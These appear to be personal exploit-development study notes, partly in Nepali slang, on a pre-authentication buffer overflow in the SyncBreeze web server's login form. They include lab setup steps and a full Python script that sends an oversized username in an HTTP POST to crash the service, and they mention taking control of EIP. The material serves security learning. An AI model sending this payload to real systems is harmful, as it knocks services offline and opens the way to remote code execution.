
Application runs webserver port 80 ; username field of HTTP POST ; pre-auth buffer-overflow ; haha muji normal webserver mah username - brute force , social engineering  ; application [x86x64] sakkyo once control the EIP --> control the flow of the program ; 

What happened --> char.buffer thiyo 760 , so we sent 760 + shellcode to the application ; CONTROL THE EIP -->lets control that bad boy ; 

### CRASH THE PROGRAM !

Install SyncBreeze --> Enable web server --> Connect Windbg --> Open webserver !


![[images_/sync_install.png]]


WebSite -> Login page !

![[images_/login_page.png]]



Proxy with Burp !

![[images_/burp_login.png]]




```crash.py

#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

```





